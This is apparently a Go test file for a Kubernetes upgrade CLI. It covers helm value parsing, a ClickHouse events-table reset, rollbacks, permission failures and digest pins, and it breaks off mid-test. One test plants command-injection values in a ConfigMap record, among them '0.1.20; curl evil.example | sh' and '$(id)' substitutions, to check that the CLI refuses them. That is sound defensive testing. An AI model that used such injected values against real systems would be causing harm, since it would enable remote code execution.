package cmd

import (
	"maps"
	"reflect"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/qubelylabs/origamy-cli/internal/token"
)

// ── helm --set ───────────────────────────────────────────────────────────────

func TestParseHelmSets(t *testing.T) {
	for _, tc := range []struct {
		sets []string
		want []setPair
	}{
		{[]string{"a.b=c"}, []setPair{{[]string{"a", "b"}, "c"}}},
		{[]string{"a=1,b.c=2"}, []setPair{{[]string{"a"}, "1"}, {[]string{"b", "c"}, "2"}}},
		{[]string{"foo=bar,clickhouse.initSchema=false"}, []setPair{{[]string{"foo"}, "bar"}, {[]string{"clickhouse", "initSchema"}, "false"}}},
		// An escaped comma, and commas inside braces, belong to the value.
		{[]string{`a=x\,y,b=z`}, []setPair{{[]string{"a"}, "x,y"}, {[]string{"b"}, "z"}}},
		{[]string{"a={x,y},b=z"}, []setPair{{[]string{"a"}, "{x,y}"}, {[]string{"b"}, "z"}}},
		// An escaped dot belongs to the name.
		{[]string{`ingress.annotations.a\.b/c=d`}, []setPair{{[]string{"ingress", "annotations", "a.b/c"}, "d"}}},
		// A pair without = is helm's to refuse; the others are read.
		{[]string{"junk,a=b"}, []setPair{{[]string{"a"}, "b"}}},
		{[]string{"a="}, []setPair{{[]string{"a"}, ""}}},
		{[]string{"a=b", "c=d"}, []setPair{{[]string{"a"}, "b"}, {[]string{"c"}, "d"}}},
		{nil, nil},
	} {
		if got := parseHelmSets(tc.sets); !reflect.DeepEqual(got, tc.want) {
			t.Errorf("parseHelmSets(%q) = %v, want %v", tc.sets, got, tc.want)
		}
	}
}

func TestEffectiveValues(t *testing.T) {
	vals := map[string]any{
		"clickhouse":   map[string]any{"image": "clickhouse/clickhouse-server:25.3", "host": "old.example.com"},
		"bulkerWorker": map[string]any{"image": map[string]any{"digest": "sha256:abc"}},
	}
	eff := effectiveValues(vals, []string{
		"clickhouse.initSchema=FALSE,clickhouse.host=null",
		"bulkerWorker.image.digest=",
		"portalAgent.image.tag=0.1.20",
	})
	if got := valueAt(eff, "clickhouse", "initSchema"); got != false {
		t.Errorf("initSchema = %v (%T), want the boolean false", got, got)
	}
	if got := valueAt(eff, "clickhouse", "host"); got != nil {
		t.Errorf("host = %v, want it removed by null", got)
	}
	if got := stringAt(eff, "clickhouse", "image"); got != "clickhouse/clickhouse-server:25.3" {
		t.Errorf("image = %q, want it kept", got)
	}
	if got := digestPins(eff, nil); len(got) != 0 {
		t.Errorf("an empty digest still pins: %v", got)
	}
	if got := stringAt(eff, "portalAgent", "image", "tag"); got != "0.1.20" {
		t.Errorf("a new nested key = %q", got)
	}
	// The original is not touched.
	if got := digestPins(vals, nil); !slices.Equal(got, []string{"bulkerWorker"}) || stringAt(vals, "clickhouse", "host") != "old.example.com" {
		t.Errorf("effectiveValues changed its input: %v", vals)
	}
}

func TestTargetTags(t *testing.T) {
	if got := targetTags("0.1.20", nil, nil); !slices.Equal(got, []string{"0.1.20"}) {
		t.Errorf("got %v", got)
	}
	sets := []string{"bulkerWorker.image.tag=0.1.17,preset=starter", "portalAgent.image.tag=main", "x.image.tag=0.1.20", "global.imageTag=9.9.9", "y.image.digest=sha256:aa", "postgres.image.tag=15.2", "redis.image.tag=7.0.1"}
	got := targetTags("0.1.20", sets, nil)
	if !slices.Equal(got, []string{"0.1.17", "0.1.20", "15.2", "7.0.1", "main"}) {
		t.Errorf("got %v", got)
	}
	// Only the data-plane services' images have a say: a datastore's tag is
	// its own version.
	got = targetTags("0.1.20", sets, []string{"bulkerWorker", "portalAgent"})
	if !slices.Equal(got, []string{"0.1.17", "0.1.20", "main"}) {
		t.Errorf("got %v", got)
	}
}

func TestDigestPins(t *testing.T) {
	vals := map[string]any{
		"a": map[string]any{"image": map[string]any{"digest": "sha256:aa"}},
		"b": map[string]any{"image": map[string]any{"digest": ""}},
		"c": map[string]any{"image": map[string]any{"tag": "0.1.20"}},
		"d": "text",
	}
	if got := digestPins(vals, nil); !slices.Equal(got, []string{"a"}) {
		t.Errorf("got %v", got)
	}
	if got := digestPins(vals, []string{"c"}); len(got) != 0 {
		t.Errorf("a pin of something that is not a data-plane service counts: %v", got)
	}
	if clearsDigestPins([]string{"a.image.digest=", "b.image.digest=sha256:aa"}, []string{"b"}) || !clearsDigestPins([]string{"a.image.digest=null"}, []string{"a"}) {
		t.Errorf("clearsDigestPins")
	}
}

// ── Which moves can touch the events table ───────────────────────────────────

func TestMovesAcrossReset(t *testing.T) {
	tagged := func(tags ...string) imageSet { return imageSet{tags: tags} }
	for _, tc := range []struct {
		name      string
		installed imageSet
		none      bool
		target    []string
		cleared   bool
		want      bool
	}{
		{"0.1.19 to 0.1.20", tagged("0.1.19"), false, []string{"0.1.20"}, false, false},
		{"0.1.20 to 0.1.19", tagged("0.1.20"), false, []string{"0.1.19"}, false, false},
		{"0.1.16 to 0.1.17", tagged("0.1.16"), false, []string{"0.1.17"}, false, false},
		{"the same tags", tagged("0.1.20"), false, []string{"0.1.20"}, false, false},
		{"the same unnumbered tag", tagged("main"), false, []string{"main"}, false, false},
		{"across the reset", tagged("0.1.17"), false, []string{"0.1.20"}, false, true},
		{"back across the reset", tagged("0.1.20"), false, []string{"0.1.17"}, false, true},
		{"edge channel from the old side", tagged("0.1.17"), false, []string{"staging"}, false, true},
		{"edge channel from the new side", tagged("0.1.20"), false, []string{"staging"}, false, false},
		{"unnumbered installed", tagged("main"), false, []string{"0.1.20"}, false, true},
		{"mixed installed", tagged("0.1.17", "0.1.20"), false, []string{"0.1.20"}, false, true},
		{"unnumbered target", tagged("0.1.19"), false, []string{"0.1.20", "main"}, false, true},
		{"unreadable installed", imageSet{}, true, []string{"0.1.20"}, false, true},
		{"digests alone move nothing", imageSet{digests: []string{"r@sha256:aa"}}, false, []string{"0.1.20"}, false, false},
		{"digests alone, one cleared", imageSet{digests: []string{"r@sha256:aa"}}, false, []string{"0.1.20"}, true, true},
		{"a rollback to digests alone", tagged("0.1.20"), false, nil, false, true},
	} {
		if got, why := movesAcrossReset(tc.installed, tc.none, tc.target, tc.cleared); got != tc.want || (got && why == "") {
			t.Errorf("%s: got %v (%q), want %v", tc.name, got, why, tc.want)
		}
	}
}

func TestManifestImageSet(t *testing.T) {
	m := "image: " + fakeRepo + "bulker-worker:0.1.20\nimage: " + fakeRepo + "portal-agent@" + fakeDigest + "\nimage: grafana/alloy:v1\nimage: " + fakeRepo + "bulker-worker:0.1.20\n"
	set, none := manifestImageSet(m)
	if none || !slices.Equal(set.tags, []string{"0.1.20"}) || len(set.digests) != 1 || set.gen() != "json" {
		t.Fatalf("got %+v %v", set, none)
	}
	if _, none := manifestImageSet("image: grafana/alloy:v1\n"); !none {
		t.Fatalf("a manifest without data-plane images is none")
	}
}

func TestJudgeImages(t *testing.T) {
	dep := func(name, image string) kubeObject {
		o := kubeObject{Kind: "Deployment"}
		o.Metadata.Name = name
		o.Spec.Template.Spec.Containers = []kubeContainer{{Name: name, Image: image}}
		return o
	}
	pod := func(name, image string) kubeObject {
		o := kubeObject{Kind: "Pod"}
		o.Metadata.Name = name
		o.Spec.Containers = []kubeContainer{{Name: name, Image: image}}
		return o
	}
	json, str, digest, main := fakeRepo+"bulker-worker:0.1.20", fakeRepo+"portal-agent:0.1.17", fakeRepo+"source-worker@"+fakeDigest, fakeRepo+"predictor:main"
	for _, tc := range []struct {
		name           string
		objs           []kubeObject
		want           string
		strict         bool
		gen            string
		wrong, waiting int
		services       int
	}{
		{"agree", []kubeObject{dep("a", json), dep("b", fakeRepo+"x-y:0.1.19")}, "", true, "json", 0, 0, 2},
		{"specs of both sides", []kubeObject{dep("a", json), dep("b", str)}, "", false, "", 1, 0, 2},
		{"the wrong side", []kubeObject{dep("a", json), dep("b", str)}, "json", true, "json", 1, 0, 1},
		{"a pod of the other side waits", []kubeObject{dep("a", json), pod("a-1", str)}, "json", true, "json", 0, 1, 1},
		{"a digest, strict", []kubeObject{dep("a", json), dep("s", digest)}, "json", true, "json", 1, 0, 1},
		{"a digest, lenient", []kubeObject{dep("a", json), dep("s", digest)}, "json", false, "json", 0, 0, 1},
		{"a tag that is no release, lenient", []kubeObject{dep("a", json), dep("p", main)}, "", false, "json", 0, 0, 1},
		{"a tag that is no release, strict", []kubeObject{dep("a", json), dep("p", main), pod("p-1", main)}, "json", true, "json", 2, 0, 1},
	} {
		v := judgeImages(tc.objs, tc.want, tc.strict)
		if v.gen != tc.gen || len(v.wrong) != tc.wrong || len(v.waiting) != tc.waiting || v.services != tc.services {
			t.Errorf("%s: got gen=%q wrong=%v waiting=%v services=%d, want gen=%q wrong=%d waiting=%d services=%d", tc.name, v.gen, v.wrong, v.waiting, v.services, tc.gen, tc.wrong, tc.waiting, tc.services)
		}
	}
	// The digest is told apart from a tag that is no release.
	v := judgeImages([]kubeObject{dep("s", digest)}, "json", true)
	if len(v.wrong) != 1 || !strings.Contains(v.wrong[0], "pinned by digest alone") {
		t.Errorf("digest wording: %v", v.wrong)
	}
}

// ── An ordinary move behaves as it did before the reset existed ──────────────

func TestOrdinaryMovesNeverContactClickHouse(t *testing.T) {
	// Whatever is wrong with ClickHouse or with the user's permissions, a move
	// that cannot touch the events table neither asks it anything nor needs a
	// lease, a record, or any permission beyond helm's own and reading objects.
	broken := func(f *fakeKube) *fakeKube {
		f.chNotReady, f.execForbidden, f.probeFails = true, true, true
		return f
	}
	upgrade := func(args ...string) func(*testing.T, *fakeKube) (string, error) {
		return func(t *testing.T, f *fakeKube) (string, error) { return upgradeK8s(t, "0.1.20", args...) }
	}
	for _, tc := range []struct {
		name  string
		setup func() func(*testing.T) *fakeKube
		run   func(*testing.T, *fakeKube) (string, error)
		want  string
	}{
		{"0.1.19 to 0.1.20", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.19", "JSON")) }
		}, upgrade(), "Upgraded"},
		{"0.1.16 to 0.1.17", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.16", "String")) }
		}, func(t *testing.T, f *fakeKube) (string, error) { return upgradeK8s(t, "0.1.17") }, "Upgraded"},
		{"nothing to do", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.20", "JSON")) }
		}, upgrade(), "Already on 0.1.20"},
		{"a value", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.20", "JSON")) }
		}, upgrade("clickhouse.resources.limits.memory=4Gi"), "Upgraded"},
		{"ClickHouse's own settings", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.20", "JSON")) }
		}, upgrade("clickhouse.image=clickhouse/clickhouse-server:25.8,clickhouse.persistence.size=50Gi"), "Upgraded"},
		{"the AI engine", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.20", "JSON")) }
		}, func(t *testing.T, f *fakeKube) (string, error) {
			var err error
			out := captureStdout(t, func() { err = upgradeKubernetes("0.1.20", "stable", nil, true, false, false, false, false, true) })
			return out, err
		}, "AI engine"},
		{"the table is the old one under new images", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.19", "String")) }
		}, upgrade(), "Upgraded"},
		{"an external ClickHouse", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.19", "").useExternal("String")) }
		}, upgrade(), "Upgraded"},
		{"a digest pin that stays", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube {
				return broken(newFakeKube(t, "0.1.19", "JSON").pinDigest("bulkerWorker"))
			}
		}, upgrade(), "Upgraded"},
		{"the release's ClickHouse is elsewhere", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube { return broken(newFakeKube(t, "0.1.19", "JSON")) }
		}, upgrade("clickhouse.host=managed-ch.example.com"), "Upgraded"},
		{"a rollback within one side", func() func(*testing.T) *fakeKube {
			return func(t *testing.T) *fakeKube {
				f := broken(newFakeKube(t, "0.1.19", "JSON"))
				f.history = append(f.history, fakeRev{rev: 2, chart: "0.1.20", tags: allTags("0.1.20"), chImage: chartCH("0.1.20")})
				return f
			}
		}, func(t *testing.T, f *fakeKube) (string, error) {
			var err error
			out := captureStdout(t, func() { err = rollbackKubernetes(0) })
			return out, err
		}, "Rolled back"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := tc.setup()(t)
			out, err := tc.run(t, f)
			if err != nil || !strings.Contains(out, tc.want) {
				t.Fatalf("want it to run as before and say %q, got err=%v:\n%s", tc.want, err, out)
			}
			if !f.untouched() {
				t.Fatalf("ClickHouse was asked, or a lease or record taken, for a move that cannot touch the events table:\n%s", strings.Join(f.calls, "\n"))
			}
			if f.live != map[string]string{"0.1.19": f.live}[""] && f.asideCall() >= 0 {
				t.Fatalf("the table was moved:\n%s", strings.Join(f.calls, "\n"))
			}
		})
	}
}

func TestUpgradeIgnoresThePinsOfDatastores(t *testing.T) {
	// A datastore's image has its own versions and digests; they say nothing
	// of the events table, and are not the data-plane services' pins.
	f := newFakeKube(t, "0.1.17", "String")
	f.values["postgres"] = map[string]any{"image": map[string]any{"digest": fakeDigest}}
	out, err := upgradeK8s(t, "0.1.20", "redis.image.tag=7.0.1", "postgres.image.tag=15.2")
	if err != nil || f.live != "JSON" || !strings.Contains(out, "Upgraded") {
		t.Fatalf("a datastore's pin or tag stopped the upgrade: err=%v:\n%s", err, out)
	}
	g := newFakeKube(t, "0.1.16", "String")
	if out, err := upgradeK8s(t, "0.1.17", "redis.image.tag=7.0.1"); err != nil || !g.untouched() {
		t.Fatalf("err=%v:\n%s", err, out)
	}
}

func TestOrdinaryMoveWhoseObjectsCannotBeListed(t *testing.T) {
	// The check reads objects; where the user may not, it says so and leaves the
	// verdict to the operator instead of failing a run that went through.
	f := newFakeKube(t, "0.1.19", "JSON")
	f.listForbidden = true
	out, err := upgradeK8s(t, "0.1.20")
	if err != nil || !strings.Contains(out, "Upgraded") || !strings.Contains(out, "images it runs were not checked") {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
}

func TestOrdinaryMoveWithTheRecordUnreadable(t *testing.T) {
	// A user who may not read ConfigMaps still upgrades what cannot touch the
	// events table (with a warning), and is told what a move that can needs.
	f := newFakeKube(t, "0.1.19", "JSON")
	f.markerReadForbidden = true
	out, err := upgradeK8s(t, "0.1.20")
	if err != nil || !strings.Contains(out, "Upgraded") || !strings.Contains(out, "may not read ConfigMaps") {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
	g := newFakeKube(t, "0.1.17", "String")
	g.markerReadForbidden = true
	out, err = upgradeK8s(t, "0.1.20")
	if err == nil || !strings.Contains(out, "Grant get on configmaps") || g.at(helmUpgrade) >= 0 || g.lease != nil {
		t.Fatalf("a move that can touch the table needs the record: err=%v:\n%s", err, out)
	}
}

func TestUpgradeRefusesARecordThisCLIDidNotWrite(t *testing.T) {
	// The record is a ConfigMap anyone who may write ConfigMaps in the
	// namespace can write, and its aside name goes into the statement the
	// reset runs in the ClickHouse pod: a record not of this CLI's shape is
	// refused before anything runs, not obeyed.
	for _, tc := range []struct{ field, value string }{
		{"aside", `x"; id; echo "`},
		{"aside", "events_pre_reset_1 TO events.y"},
		{"version", "0.1.20; curl evil.example | sh"},
		{"channel", "edge --set x=$(id)"},
		{"action", "drop"},
	} {
		t.Run(tc.field, func(t *testing.T) {
			f := newFakeKube(t, "0.1.17", "String").withMarker("0.1.20", "events_pre_reset_100")
			f.marker[tc.field] = tc.value
			before := maps.Clone(f.marker)
			out, err := upgradeK8s(t, "0.1.20")
			msg := out
			if err != nil {
				msg += err.Error()
			}
			if err == nil || !strings.Contains(msg, "not a record this CLI wrote") || !strings.Contains(msg, "kubectl delete configmap "+resetMarkerConfigMap) {
				t.Fatalf("got err=%v:\n%s", err, out)
			}
			if f.at(helmUpgrade) >= 0 || f.lease != nil || !maps.Equal(f.marker, before) {
				t.Fatalf("a refused run changed the cluster: helm=%d lease=%v record=%v", f.at(helmUpgrade), f.lease, f.marker)
			}
			for _, c := range f.calls {
				if strings.Contains(c, "exec") {
					t.Fatalf("ran in the ClickHouse pod: %s", c)
				}
			}
		})
	}
}

// ── ClickHouse that cannot be asked ──────────────────────────────────────────

func TestAskingClickHouseFailsFastOnAMissingPermission(t *testing.T) {
	f := newFakeKube(t, "0.1.17", "String")
	// A wait that would last long if the refusal were retried.
	kubeAskTimeout, kubeClickHouseTimeout = time.Minute, time.Minute
	f.execForbidden = true
	start := time.Now()
	out, err := upgradeK8s(t, "0.1.20")
	if time.Since(start) > 10*time.Second {
		t.Fatalf("a permission that is missing was waited for: %s", time.Since(start))
	}
	if err == nil || !strings.Contains(out, "create on pods/exec in namespace origamy-dp") || !strings.Contains(out, "kubectl auth can-i create pods/exec -n origamy-dp") {
		t.Fatalf("want the missing permission named, got err=%v:\n%s", err, out)
	}
	if strings.Contains(out, "Once it answers") || strings.Contains(out, "does not answer") || strings.Contains(out, "Check: kubectl get pods") {
		t.Fatalf("advice for a ClickHouse that is down, to a user who may not ask it:\n%s", out)
	}
	if f.count("kubectl exec") != 1 {
		t.Fatalf("the refused exec was retried %d times:\n%s", f.count("kubectl exec"), strings.Join(f.calls, "\n"))
	}
	if f.at(helmUpgrade) >= 0 || f.lease != nil || f.marker != nil || !strings.Contains(out, "Nothing has been changed.") {
		t.Fatalf("a refused run changed something:\n%s", strings.Join(f.calls, "\n"))
	}
}

func TestAskingClickHouseFailsFastOnAPermissionToList(t *testing.T) {
	f := newFakeKube(t, "0.1.17", "String")
	kubeAskTimeout = time.Minute
	f.listForbidden = true
	start := time.Now()
	out, err := upgradeK8s(t, "0.1.20")
	if time.Since(start) > 10*time.Second || err == nil || !strings.Contains(out, "not allowed to list StatefulSets and pods in namespace origamy-dp") {
		t.Fatalf("got err=%v after %s:\n%s", err, time.Since(start), out)
	}
}

func TestAskingClickHouseNamesThePodState(t *testing.T) {
	for _, tc := range []struct {
		waiting, want string
		stuck         bool // a state waiting does not mend: refused at once
	}{
		{"", "odp-clickhouse-0 is Pending, not ready", false},
		{"ContainerCreating", "odp-clickhouse-0 is Pending, ContainerCreating", false},
		{"ImagePullBackOff", "odp-clickhouse-0 is Pending, ImagePullBackOff", true},
		{"CrashLoopBackOff", "odp-clickhouse-0 is Pending, CrashLoopBackOff", true},
	} {
		f := newFakeKube(t, "0.1.17", "String")
		f.chNotReady, f.chWaiting = true, tc.waiting
		kubeAskTimeout = 300 * time.Millisecond
		kubePoll = 100 * time.Millisecond
		start := time.Now()
		out, err := upgradeK8s(t, "0.1.20")
		if took := time.Since(start); tc.stuck && took > 250*time.Millisecond || !tc.stuck && took < 250*time.Millisecond {
			t.Errorf("%q: stuck=%v but the run took %s", tc.waiting, tc.stuck, took)
		}
		if err == nil || !strings.Contains(out, "no ClickHouse pod is ready ("+tc.want) || !strings.Contains(out, "Check: kubectl get pods -n origamy-dp") || !strings.Contains(out, "Once it answers, rerun `origamy upgrade --version 0.1.20`") {
			t.Errorf("%q: got err=%v:\n%s", tc.waiting, err, out)
		}
		if f.at(helmUpgrade) >= 0 || f.lease != nil {
			t.Errorf("%q: a refused run changed something", tc.waiting)
		}
	}
}

func TestAskingClickHouseThatIsScaledToZero(t *testing.T) {
	f := newFakeKube(t, "0.1.17", "String")
	f.chScaledDown = true
	kubeAskTimeout = time.Minute
	start := time.Now()
	out, err := upgradeK8s(t, "0.1.20")
	if time.Since(start) > 10*time.Second || err == nil || !strings.Contains(out, "ClickHouse StatefulSet odp-clickhouse is scaled to 0") || !strings.Contains(out, "kubectl scale statefulset odp-clickhouse -n origamy-dp --replicas=1") {
		t.Fatalf("got err=%v after %s:\n%s", err, time.Since(start), out)
	}
	if f.at(helmUpgrade) >= 0 || f.lease != nil {
		t.Fatalf("a refused run changed something")
	}
	// A move that does not ask is not held up by it.
	g := newFakeKube(t, "0.1.19", "JSON")
	g.chScaledDown = true
	if out, err := upgradeK8s(t, "0.1.20"); err != nil || !g.untouched() {
		t.Fatalf("err=%v:\n%s", err, out)
	}
}

func TestKubeCheckFailPermanent(t *testing.T) {
	f := newFakeKube(t, "0.1.20", "JSON")
	f.execForbidden = true
	var c kubeCheck
	var err error
	out := captureStdout(t, func() {
		c = kubeEventsCheck(checkFull, false, "")
		err = kubeCheckFail("The chart is on 0.1.20", "origamy upgrade --version 0.1.20", c, false, false)
	})
	if err == nil || !c.denied || !strings.Contains(out, "create on pods/exec in namespace origamy-dp") || strings.Contains(out, "Once it answers") {
		t.Fatalf("got %+v:\n%s", c, out)
	}
	if f.count("kubectl exec") != 1 {
		t.Fatalf("the refused exec was retried:\n%s", strings.Join(f.calls, "\n"))
	}
}

func TestKubeCheckFailWording(t *testing.T) {
	f := newFakeKube(t, "0.1.20", "JSON")
	f.chNotReady = true
	var out string
	captureStdout(t, func() {})
	out = captureStdout(t, func() {
		c := kubeEventsCheck(checkFull, false, "")
		_ = kubeCheckFail("The chart is on 0.1.20", "origamy upgrade --version 0.1.20", c, false, false)
	})
	if strings.Contains(out, "Once it answers: Then") || !strings.Contains(out, "Once it answers, `origamy upgrade --version 0.1.20` checks again.") {
		t.Fatalf("wording:\n%s", out)
	}
	// No message about Kubernetes names a chart that was never published.
	for _, bad := range []string{"0.1.18"} {
		if strings.Contains(out, bad) {
			t.Fatalf("names %s:\n%s", bad, out)
		}
	}
}

// ── The reset is recorded before the chart moves ─────────────────────────────

func TestUpgradeRecordsTheResetBeforeHelmAndKeepsItWhenHelmFailsAfterApplying(t *testing.T) {
	f := newFakeKube(t, "0.1.17", "String")
	f.helmAppliesThenFails = true
	out, err := upgradeK8s(t, "0.1.20")
	if err == nil || strings.Contains(out, "Upgraded") {
		t.Fatalf("want the run to fail, got err=%v:\n%s", err, out)
	}
	if rec := f.at(markerWrite); rec < 0 || rec > f.at(helmUpgrade) {
		t.Fatalf("the record was not written before helm:\n%s", strings.Join(f.calls, "\n"))
	}
	if f.marker["version"] != "0.1.20" || f.marker["action"] != markerReset || f.marker["aside"] == "" || f.cur().chart != "0.1.20" {
		t.Fatalf("record %v, chart %s: want the reset recorded and the chart moved", f.marker, f.cur().chart)
	}
	if f.live != "String" || f.asideCall() >= 0 || f.lease != nil {
		t.Fatalf("live=%q lease=%v: ClickHouse must not have been touched, the lease given up", f.live, f.lease)
	}
	for _, want := range []string{"Helm reported an error after it began applying the chart", "`origamy upgrade --version 0.1.20` finishes it", "ClickHouse itself was not touched"} {
		if !strings.Contains(out, want) {
			t.Fatalf("lacks %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "pods keep starting") {
		t.Fatalf("the install-timeout reassurance, for a run that left the table unreset:\n%s", out)
	}
	// A rerun finishes it: the chart is already there.
	f.helmAppliesThenFails = false
	f.calls = nil
	out, err = upgradeK8s(t, "0.1.20")
	if err != nil || f.live != "JSON" || len(f.dropped) != 1 || f.marker != nil || f.lease != nil {
		t.Fatalf("rerun: err=%v live=%q dropped=%v record=%v:\n%s", err, f.live, f.dropped, f.marker, out)
	}
}

func TestUpgradeTakesBackTheRecordWhenHelmDidNotMove(t *testing.T) {
	t.Run("there was none", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		f.helmFails = true
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || f.marker != nil || f.lease != nil || f.live != "String" || f.cur().chart != "0.1.17" {
			t.Fatalf("err=%v record=%v lease=%v:\n%s", err, f.marker, f.lease, out)
		}
		if !strings.Contains(out, "The release did not move (still revision 1)") {
			t.Fatalf("does not say nothing moved:\n%s", out)
		}
	})
	t.Run("an earlier run's is put back", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "JSON").withMarker("0.1.20", "events_pre_reset_100")
		f.helmFails = true
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || f.marker["aside"] != "events_pre_reset_100" || f.marker["action"] != markerReset {
			// The run only finishes (JSON table): it writes nothing, helm fails,
			// and what was recorded stays as it was.
			t.Fatalf("err=%v record=%v:\n%s", err, f.marker, out)
		}
	})
	t.Run("an earlier run's is put back after a rewrite", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "String").withMarker("0.1.20", "events_pre_reset_100")
		f.helmFails = true
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || f.marker["aside"] != "events_pre_reset_100" || f.marker["action"] != markerReset || f.lease != nil {
			t.Fatalf("err=%v record=%v:\n%s", err, f.marker, out)
		}
	})
}

// ── Bundled and external ClickHouse ──────────────────────────────────────────

func TestUpgradeWithTheServicesPointedElsewhereRefusesTheReset(t *testing.T) {
	// clickhouse.host moves the services (and the chart's schema Job) to
	// another server whatever clickhouse.enabled says; the chart's own
	// StatefulSet still runs. Neither is reset by the CLI.
	f := newFakeKube(t, "0.1.17", "").useExternal("String")
	f.hostOnly = true // clickhouse.enabled stays true
	out, err := upgradeK8s(t, "0.1.20")
	if err == nil || !strings.Contains(out, "never resets an external ClickHouse") || !strings.Contains(out, "also runs the chart's own ClickHouse") || !strings.Contains(out, "Nothing has been changed.") {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
	if f.at(helmUpgrade) >= 0 || f.count("kubectl exec") != 0 || f.lease != nil || f.marker != nil {
		t.Fatalf("something changed, or the bundled ClickHouse was reset:\n%s", strings.Join(f.calls, "\n"))
	}
}

func TestUpgradeThatPointsTheServicesElsewhere(t *testing.T) {
	// A --set that sends the services to another host is judged by the values
	// the release will have: external, so a chart too old for that is refused.
	f := newFakeKube(t, "0.1.19", "JSON")
	f.latest = "0.1.20"
	out, err := upgradeK8s(t, "0.1.17", "clickhouse.host=managed-ch.example.com")
	if err == nil || !strings.Contains(out, "uses an external ClickHouse, which needs chart "+minChartExternalClickHouse) || f.at(helmUpgrade) >= 0 {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
}

// ── Pins by digest ───────────────────────────────────────────────────────────

func TestUpgradeThatCrossesTheResetWithAServicePinnedByDigest(t *testing.T) {
	t.Run("refused before the chart moves", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String").pinDigest("bulkerWorker")
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || !strings.Contains(out, "Service bulkerWorker is pinned by digest") || !strings.Contains(out, "--set bulkerWorker.image.digest=") || !strings.Contains(out, "Nothing has been changed.") {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
		if f.at(helmUpgrade) >= 0 || f.live != "String" || f.lease != nil || f.marker != nil || f.count("kubectl exec") != 0 {
			t.Fatalf("a refused run changed something:\n%s", strings.Join(f.calls, "\n"))
		}
		// And the advice does what it says: with the pin cleared the move runs.
		out, err = upgradeK8s(t, "0.1.20", "bulkerWorker.image.digest=")
		if err != nil || f.live != "JSON" || len(f.dropped) != 1 || f.cur().digests["bulker-worker"] != "" || f.cur().tags["bulker-worker"] != "0.1.20" {
			t.Fatalf("with the pin cleared: err=%v live=%q dropped=%v digests=%v:\n%s", err, f.live, f.dropped, f.cur().digests, out)
		}
	})
	t.Run("a pin set by this run", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		out, err := upgradeK8s(t, "0.1.20", "portalAgent.image.digest="+fakeDigest)
		if err == nil || !strings.Contains(out, "Service portalAgent is pinned by digest") || f.at(helmUpgrade) >= 0 {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
	t.Run("clearing the pin of a plane on digests", func(t *testing.T) {
		// Its images name no release: clearing them moves them to the tag, which
		// can touch the events table, so ClickHouse decides.
		f := newFakeKube(t, "0.1.19", "JSON").pinDigest("bulkerWorker")
		out, err := upgradeK8s(t, "0.1.20", "bulkerWorker.image.digest=")
		if err != nil || f.count("kubectl exec") == 0 || f.cur().digests["bulker-worker"] != "" {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
	t.Run("digest images the values do not pin come from the chart", func(t *testing.T) {
		// Nothing the operator set explains them, and a digest names no
		// release: the move cannot be told, nor checked afterwards, so it is
		// refused before the chart moves unless this run clears them.
		f := newFakeKube(t, "0.1.19", "JSON").pinDigest("bulkerWorker")
		f.chartDigests = true
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || !strings.Contains(out, "pinned by digest that your values do not set") || !strings.Contains(out, "Nothing has been changed.") || f.at(helmUpgrade) >= 0 || f.lease != nil {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
		out, err = upgradeK8s(t, "0.1.20", "bulkerWorker.image.digest=")
		if err != nil || f.cur().digests["bulker-worker"] != "" {
			t.Fatalf("with the pin cleared: err=%v:\n%s", err, out)
		}
	})
	t.Run("a move within one side keeps the pin and says nothing of it", func(t *testing.T) {
		f := newFakeKube(t, "0.1.19", "JSON").pinDigest("bulkerWorker")
		out, err := upgradeK8s(t, "0.1.20")
		if err != nil || !f.untouched() || f.cur().digests["bulker-worker"] != fakeDigest {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
}

func TestRollbackFromDigestPinsIsAskedAbout(t *testing.T) {
	// The installed release runs a service by digest, which names no release;
	// the revision replaces it with an image of the pre-reset side. ClickHouse
	// decides: it holds the new table, so the rollback is refused.
	f := newFakeKube(t, "0.1.17", "JSON")
	f.history = append(f.history, fakeRev{rev: 2, chart: "0.1.20", tags: allTags("0.1.20"), digests: map[string]string{"bulker-worker": fakeDigest}, chImage: chartCH("0.1.20")})
	var err error
	out := captureStdout(t, func() { err = rollbackKubernetes(0) })
	if err == nil || f.at("helm rollback") >= 0 || f.count("kubectl exec") == 0 || !strings.Contains(out, "predates the storage reset") {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
	// With the same digest on both sides and the same tags, nothing moves.
	g := newFakeKube(t, "0.1.19", "JSON")
